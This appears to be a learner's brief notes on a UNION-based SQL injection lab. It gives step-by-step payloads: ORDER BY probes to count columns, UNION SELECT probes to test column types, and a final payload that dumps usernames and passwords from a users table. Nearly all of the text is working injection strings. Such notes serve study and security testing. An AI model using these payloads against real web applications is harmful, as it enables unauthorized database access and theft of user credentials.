Analysis:
----------

to do union and select from another table the no of cloumn should be same and the data type should be same

1. Determine the no of comumn:

	' order by 1--
	' order by 2--
	' order by 3--    --> internal server error

no of col = 3-1 = 2



2. Determine data type of columns:

	' union select 'a', NULL--
	' union select NULL, 'a'--

	---> both are string type since both didnt give error

3. To display username and password from users table:

	' union select username, password from users--
